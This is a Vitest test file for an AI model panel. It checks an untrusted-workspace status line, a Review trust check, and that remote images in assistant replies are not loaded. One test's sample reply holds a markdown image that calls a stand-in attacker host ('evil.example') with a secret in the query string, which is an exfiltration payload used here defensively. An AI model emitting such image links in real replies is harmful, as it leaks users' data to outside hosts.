// @vitest-environment jsdom
import type { WorkspaceContext } from "@halonicjs/studio-shell";
import { verifies } from "@halonicjs/testing-spec";
import { act } from "react";
import { afterEach, describe, expect, it, vi } from "vitest";
import { buttonNamed, chatOf, fakeHost, sendMessage, show, unmount } from "../test-support.tsx";
import { AssistantPanel } from "./assistant-panel.tsx";

afterEach(unmount);

const line = "Not trusted yet · it can read and propose, but not run anything.";

function panel(fake: ReturnType<typeof fakeHost>) {
  const services = { get: () => fake.host, find: () => fake.host };
  const context = {
    services,
    announcer: { announce: vi.fn() },
    runCommand: vi.fn(() => true),
  } as unknown as WorkspaceContext;
  return <AssistantPanel context={context} title="Assistant" onClose={() => {}} />;
}

verifies("assistant.chat.authoring-only", () => {
  describe("a Build chat before trust (H17)", () => {
    it("says under the box that it can read and propose but not run anything, with Review", async () => {
      const fake = fakeHost([chatOf("c1")]);
      await fake.setAuthoringOnly(true);
      const page = await show(panel(fake));
      const status = page.querySelector('[role="status"]');
      expect(status?.textContent).toContain(line);
      await act(async () => buttonNamed(page, "Review")?.click());
      expect(fake.trustChecks()).toBe(1);
    });

    it("drops the line once the workspace is trusted", async () => {
      const fake = fakeHost([chatOf("c1")]);
      await fake.setAuthoringOnly(true);
      const page = await show(panel(fake));
      expect(page.textContent).toContain(line);
      await fake.setAuthoringOnly(false);
      expect(page.textContent).not.toContain(line);
    });

    it("shows no line on a trusted workspace", async () => {
      const page = await show(panel(fakeHost([chatOf("c1")])));
      expect(page.textContent).not.toContain(line);
    });

    it("loads no remote image from the reply: it shows as its text (HAL-720 condition 4)", async () => {
      const fake = fakeHost();
      await fake.setAuthoringOnly(true);
      const page = await show(panel(fake));
      await sendMessage(page, "Show me the routine");
      const reply = "Here: ![chart](https://evil.example/c?d=secret)";
      await fake.finish({
        messages: [{ role: "assistant", content: reply }],
        end: { reason: "answered" },
      });
      expect(page.querySelector("img")).toBeNull();
      expect(page.textContent).toContain("![chart](https://evil.example/c?d=secret)");
    });
  });
});
